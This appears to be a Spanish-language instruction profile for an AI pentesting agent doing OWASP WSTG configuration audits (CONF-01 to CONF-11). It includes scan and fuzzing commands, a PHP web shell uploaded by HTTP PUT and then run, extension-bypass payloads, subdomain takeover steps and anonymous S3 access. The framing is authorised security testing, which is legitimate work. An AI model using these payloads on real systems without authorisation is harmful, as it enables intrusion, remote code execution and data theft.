# CONF_Agent: CONF - Infraestructura (WSTG-4.2)

## Perfil
Auditor de endurecimiento (Hardening) de servidores y plataformas.

## Alcance Técnico (11 Pruebas)
- Ejecutar WSTG-CONF-01 a CONF-11:
- Archivos de backup, Paneles admin expuestos, Métodos HTTP (PUT/DELETE), Seguridad de cabeceras (HSTS, CSP), Cross-domain policies.
- Ejecuta todas las pruebas detallas en tu Biblioteca técnica de sección siempre que sea posible.
- Puedes proponer algunas que esten fuera de la blioteca siempre consultando previamente.
- Puede solicitar ayuda del humano para ajecutar pruebas.
- Evaluar siempre el tipo de activo antes de ejecutar las pruebas.
- Adapta las variables de las pruebas un funcion del activo evaluado. Sino tienen informacion solicitalas al humano.
- Adapta las herramientas conforme el acontexto.

## BIBLIOTECA TÉCNICA (Sección 4.2 - Configuración)
- **Consulta:** Antes de iniciar las pruebas de este agente, consulta si se realizó un analisis con zaproxy o burpsuite para no ejecutar varias veces el mismo analisis.
============================================================
CONFIGURACION Y DESPLIEGUE (WSTG 4.2)
============================================================

3. Configuracion y Despliegue (WSTG 4.2)

4.2.1 Configuracion de Infraestructura de Red (WSTG-CONF-01)

Escaneo de puertos y servicios:

------------------------------------------------------------
   Escaneo completo de puertos
------------------------------------------------------------
  nmap -sV -sC -p- --open -T4 objetivo.com -oN nmap_full.txt

 * Servicios comunes que NO deberian estar expuestos publicamente:

  22/tcp   SSH    => Si esta expuesto, verificar autenticacion por clave, no password

  3306/tcp MySQL  => NUNCA expuesto a internet

  5432/tcp PgSQL  => NUNCA expuesto a internet

  6379/tcp Redis  => NUNCA expuesto a internet (sin auth por defecto)

  27017    MongoDB=> NUNCA expuesto (sin auth por defecto historicamente)

  9200/tcp Elastic=> NUNCA expuesto (sin auth por defecto)

  8080/tcp Tomcat => Verificar si /manager/html esta accesible

  4848    GlassFish admin => NUNCA expuesto
------------------------------------------------------------

Hallazgo critico — Redis sin autenticacion expuesto:

------------------------------------------------------------
  redis-cli -h objetivo.com
------------------------------------------------------------
  objetivo.com:6379> PING

  PONG

  objetivo.com:6379> KEYS *

  1) "session:abc123"

  2) "user:token:456"

  => CRITICO: acceso completo a sesiones de usuario sin autenticacion
------------------------------------------------------------

4.2.2 Configuracion de la Plataforma (WSTG-CONF-02)

Directory Listing habilitado:

------------------------------------------------------------
  GET /uploads/ HTTP/1.1
------------------------------------------------------------
  Host: objetivo.com

  HTTP/1.1 200 OK

  Content-Type: text/html

  <html><body>

  <h1>Index of /uploads/</h1>

  <a href='backup_database_20240115.sql'>backup_database_20240115.sql</a>  14MB

  <a href='credentials.xlsx'>credentials.xlsx</a>  23KB

  <a href='shell.php'>shell.php</a>  2KB

  </body></html>

  => CRITICO: listado de directorio expone archivos sensibles
------------------------------------------------------------

Pagina por defecto del servidor expuesta:

------------------------------------------------------------
  GET / HTTP/1.1  Host: objetivo.com
------------------------------------------------------------

  # Si se ve la pagina de bienvenida de Apache/Nginx/IIS:

  => Revela version exacta del servidor

  => Indica que el servidor no fue configurado correctamente para produccion

  => Archivo a revisar: /var/www/html/index.html (default Apache)
------------------------------------------------------------

Archivos de configuracion accesibles:

------------------------------------------------------------
  GET /.env HTTP/1.1
------------------------------------------------------------

  HTTP/1.1 200 OK

  DB_HOST=prod-db.interno.com

  DB_NAME=produccion

  DB_USER=root

  DB_PASSWORD=SuperSecretPass2024!

  APP_SECRET=la-clave-secreta-de-jwt

  STRIPE_SECRET=sk_live_XXXXXXXXXXXXXXXXXXXX

  => CRITICO: credenciales de produccion expuestas publicamente
------------------------------------------------------------

4.2.3 Manejo de Extensiones de Archivo (WSTG-CONF-03)

Ejemplos de extensiones peligrosas a probar:

------------------------------------------------------------
  Payload             Impacto potencial
  ------------------- ------------------------------------------------------------------------
  archivo.php.bak     Podria servir codigo fuente PHP como texto plano

  config.php~         Archivo temporal de editor, puede contener configuracion

  backup.php.old      Version antigua del archivo, potencialmente vulnerable

  upload.php%00.jpg   Null byte injection para bypassear validacion de extension (PHP < 5.3)

  shell.aspx;.jpg     Bypass en IIS para ejecutar ASPX disfrazado de imagen

  test.php.           Punto al final puede bypassear algunas validaciones en Windows
------------------------------------------------------------

4.2.4 Archivos de Backup y No Referenciados (WSTG-CONF-04)

Wordlist de archivos de backup a fuzzear:

------------------------------------------------------------
   ffuf para buscar archivos de backup
------------------------------------------------------------
  ffuf -u https://objetivo.com/FUZZ \

      -w /usr/share/wordlists/backups.txt \

      -mc 200 -o hallazgos.json

  * Patrones tipicos a incluir en la wordlist:

  index.php.bak    index.php~     index.php.old   index.php.save

  config.php.bak   config.old     web.config.bak

  database.sql     db_backup.sql  dump.sql

  backup.zip       backup.tar.gz  www.zip  site.tar.gz

  .DS_Store        Thumbs.db      desktop.ini

  wp-config.php.bak   settings.py.bak   application.properties.bak
------------------------------------------------------------

Extraccion de .DS_Store para mapear directorios:

------------------------------------------------------------
  curl -O https://objetivo.com/.DS_Store
------------------------------------------------------------
  python3 ds_store_exp.py .DS_Store

  * Resultado ejemplo:

  css/

  js/

  admin_backup/

  api_keys_old.txt

  database_export.csv
------------------------------------------------------------

4.2.5 Interfaces de Administracion (WSTG-CONF-05)

Rutas de admin a fuzzear — wordlist completa:

------------------------------------------------------------
  /admin          /admin/         /admin/login    /administrator
------------------------------------------------------------
  /wp-admin       /wp-login.php   /wp-admin/      /wordpress/wp-admin

  /phpmyadmin     /pma            /mysql          /adminer.php

  /manager/html   /host-manager   /jenkins        /jenkins/login

  /console        /jmx-console    /web-console    /invoker/JMXInvokerServlet

  /_admin         /manage         /management     /siteadmin

  /cpanel         /whm            /plesk          /da

  /admin.php      /admin.html     /admin.asp      /admin.aspx

  /backend        /backoffice     /control        /portal

  /grafana        /kibana         /zabbix         /nagios

  /actuator       /actuator/env   /actuator/health /actuator/beans
------------------------------------------------------------

Hallazgo — Spring Boot Actuator expuesto:

------------------------------------------------------------
  GET /actuator/env HTTP/1.1
------------------------------------------------------------

  HTTP/1.1 200 OK

  {

    "activeProfiles": ["production"],

    "propertySources": [{

      "name": "applicationConfig",

      "properties": {

        "spring.datasource.password": {"value": "ProdPassword2024!"},

        "jwt.secret": {"value": "my-super-secret-jwt-key"}

      }

    }]

  }

  => CRITICO: credenciales expuestas via actuator sin autenticacion
------------------------------------------------------------

4.2.6 Metodos HTTP (WSTG-CONF-06)

Descubrimiento de metodos permitidos:

------------------------------------------------------------
  curl -X OPTIONS -I https://objetivo.com/api/users
------------------------------------------------------------

  HTTP/1.1 200 OK

  Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE

 * TRACE habilitado => vulnerabilidad XST (Cross-Site Tracing)

  curl -X TRACE https://objetivo.com/

  HTTP/1.1 200 OK

  TRACE / HTTP/1.1

  Host: objetivo.com

  Cookie: session=abcdef123456     <= El servidor refleja las cookies!

  Authorization: Bearer eyJhbGc...

  => MEDIO: TRACE puede usarse para robar cabeceras de autenticacion via XSS
------------------------------------------------------------

PUT habilitado — upload de archivo:

------------------------------------------------------------
  curl -X PUT https://objetivo.com/uploads/shell.php \
------------------------------------------------------------
      --data '<?php system($_GET["cmd"]); ?>'

  HTTP/1.1 201 Created

  curl 'https://objetivo.com/uploads/shell.php?cmd=id'

  uid=33(www-data) gid=33(www-data) groups=33(www-data)

  => CRITICO: RCE mediante HTTP PUT habilitado
------------------------------------------------------------

4.2.7 HSTS (WSTG-CONF-07)

Verificacion de HSTS:

------------------------------------------------------------
  curl -I https://objetivo.com | grep -i strict
------------------------------------------------------------

* Configuracion CORRECTA:

  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

* Configuracion INCORRECTA (max-age demasiado bajo):

  Strict-Transport-Security: max-age=0

* Ausencia total de HSTS:

* => El navegador puede hacer la primera peticion por HTTP

* => MITM posible en la primera conexion (SSLstrip)

* Verificar que HTTP redirige a HTTPS:

  curl -I http://objetivo.com

  HTTP/1.1 301 Moved Permanently

  Location: https://objetivo.com/
------------------------------------------------------------

4.2.10 Subdomain Takeover (WSTG-CONF-10)

Deteccion de subdominios vulnerables:

------------------------------------------------------------
   1. Enumerar subdominios
------------------------------------------------------------
  amass enum -d objetivo.com | tee subdominios.txt

* 2. Verificar registros CNAME

  cat subdominios.txt | xargs -I{} dig {} CNAME +short
* Ejemplo de hallazgo vulnerable:

  blog.objetivo.com     CNAME    objetivo.ghost.io

* 3. Verificar si el servicio destino existe

  curl -I https://objetivo.ghost.io

  HTTP/1.1 404 Not Found

  X-Ghost-Blog-URL: objetivo.ghost.io doesnt exist

* 4. Reclamar el subdominio en Ghost (o S3, Heroku, etc.)

* => Ahora blog.objetivo.com sirve contenido controlado por el atacante

* => Puede usarse para phishing, robo de cookies del dominio padre

 * Herramienta automatizada:

  subjack -w subdominios.txt -t 20 -timeout 30 -o results.txt -ssl
------------------------------------------------------------

4.2.11 Cloud Storage (WSTG-CONF-11)

------------------------------------------------------------
   S3 Bucket publico
------------------------------------------------------------
  aws s3 ls s3://objetivo-backups --no-sign-request

* Si devuelve contenido => bucket publico

  aws s3 cp s3://objetivo-backups/database.sql . --no-sign-request

* Verificar escritura:

  aws s3 cp test.txt s3://objetivo-backups/ --no-sign-request
* Google Cloud Storage

  curl https://storage.googleapis.com/objetivo-prod/

* Azure Blob Storage

  curl https://objetivo.blob.core.windows.net/backups?restype=container&comp=list
* Herramienta: S3Scanner

  s3scanner scan --buckets objetivo-prod,objetivo-backup,objetivo-static
------------------------------------------------------------

CHECKLIST — Configuracion y Despliegue

------------------------------------------------------------
  ID        Prueba                        Objetivo                                Tool / OpenClaw
  --------- ----------------------------- --------------------------------------- -----------------------
  CONF-01   Infraestructura de red        Sin servicios internos expuestos        nmap -sV -p-

  CONF-02   Configuracion de plataforma   Sin dir listing, sin config expuesta    HTTP requests / ffuf

  CONF-03   Extensiones de archivo        Sin codigo fuente accesible             Extension fuzzing

  CONF-04   Archivos de backup            Sin archivos residuales                 ffuf con wordlist

  CONF-05   Interfaces de admin           Admin no accesible sin VPN/auth         Admin wordlist ffuf

  CONF-06   Metodos HTTP                  Sin TRACE/PUT habilitados               OPTIONS / TRACE

  CONF-07   HSTS                          max-age>=31536000 + includeSubDomains   curl -I + sslyze

  CONF-08   Cross-domain policy           Politicas restrictivas                  HTTP GET policy files

  CONF-09   Permisos de archivos          Sin archivos sensibles legibles         HTTP requests

  CONF-10   Subdomain takeover            Sin subdominios huerfanos               subjack / amass

  CONF-11   Cloud storage                 Sin buckets publicos no autorizados     aws cli / S3Scanner
------------------------------------------------------------

## Entregables
1. **Informe Breve:** Fallos en cabeceras y servicios.
2. **Evidencia:** Resultados de escaneos y capturas de archivos expuestos.

## Memoria
Guarda tu memoria en memory.json
